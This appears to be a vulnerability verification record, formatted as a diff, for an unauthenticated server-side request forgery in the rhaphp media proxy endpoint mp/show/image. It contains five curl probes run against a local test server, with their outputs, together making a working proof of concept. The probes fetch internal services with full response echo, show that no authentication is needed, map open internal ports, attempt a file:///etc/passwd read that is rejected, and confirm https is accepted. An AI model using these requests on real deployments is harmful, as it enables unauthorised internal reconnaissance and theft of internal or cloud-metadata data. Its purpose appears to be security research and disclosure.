@@ -1,0 +1,46 @@
+RHA-01: Unauthenticated full-response SSRF in mp/show/image media proxy
+Target: rhaphp (TP5.1.35), application/mp/controller/Show.php:17-44
+Local test env: php -S 127.0.0.1:8080 (docroot=repos/rhaphp), throwaway MySQL 8.0.39 on 127.0.0.1:3307 (not required by this chain), marker HTTP service on 127.0.0.1:8899 serving "RHA-SSRF-MARKER-9f3ab2c".
+Note: TP5.1 cli-server pathinfo quirk - PoC uses TP5 compat-mode param s= (/index.php?s=/mp/show/image). Equivalent to /mp/show/image?url= under Apache/Nginx PATH_INFO routing. One framework-level compat patch was applied to thinkphp/library/think/Error.php (swallow E_DEPRECATED/E_NOTICE/E_WARNING) to run TP5.1.35 under local PHP 8.4; unrelated to the vulnerability.
+
+--- Probe 1: SSRF to internal marker service, full response echo ---
+$ curl -s -w "\nHTTP %{http_code} ctype=%{content_type}\n" \
+  "http://127.0.0.1:8080/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php%3Fwx_fmt%3Dpng"
+RHA-SSRF-MARKER-9f3ab2c
+remote_addr=127.0.0.1
+HTTP 200 ctype=image/png
+=> The app server-side fetched http://127.0.0.1:8899/index.php and echoed the FULL body
+   (marker string + REMOTE_ADDR of the fetcher = the app itself). Content-type header
+   taken from wx_fmt (attacker-controlled string appended to any URL).
+
+--- Probe 2: no authentication ---
+$ curl -s -o /dev/null -H "Cookie: " -w "HTTP %{http_code}\n" \
+  "http://127.0.0.1:8080/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php"
+HTTP 200
+=> No session/cookie; controller Show does not extend the auth Base controller. Unauthenticated.
+
+--- Probe 3: arbitrary internal port reachability (banner/oracle) ---
+$ curl -s --max-time 6 -w "\nHTTP %{http_code} size=%{size_download}\n" \
+  "http://127.0.0.1:8080/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A3307%2F"
+HTTP 200 size=0
+$ curl -s -o /dev/null -w "open-port HTTP %{http_code} size=%{size_download} time=%{time_total}s\n" \
+  "http://127.0.0.1:8080/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php"
+open-port HTTP 200 size=44 time=0.03s
+=> Any http URL accepted; open vs closed internal ports distinguishable (body content / instant
+   refusal vs 30s CONNECTTIMEOUT for filtered hosts). Enough for internal service enumeration and
+   reading any internal HTTP resource (incl. cloud metadata endpoints in deployment).
+
+--- Probe 4: file:// scheme (escalation attempt) ---
+$ curl -s -w "HTTP %{http_code}\n" \
+  "http://127.0.0.1:8080/index.php?s=/mp/show/image&url=file%3A%2F%2F%2Fetc%2Fpasswd"
+非法协议HTTP 200
+=> "illegal protocol" - rejected. The strpos($url,'http')===0 check runs BEFORE urldecode(),
+   so no double-encoding bypass reaches file://. SSRF is http/https-only. No local file read.
+
+--- Probe 5: https accepted ---
+$ curl -s -o /dev/null --max-time 6 -w "HTTP %{http_code}\n" \
+  "http://127.0.0.1:8080/index.php?s=/mp/show/image&url=https%3A%2F%2F127.0.0.1%3A8899%2Findex.php"
+HTTP 200 (scheme passed the check; TLS failure only because target is plain HTTP locally)
+
+Verdict: VERIFIED - unauthenticated, no host/IP restriction, full response echo (CWE-918).
+Not upgradeable to local file read via this sink.
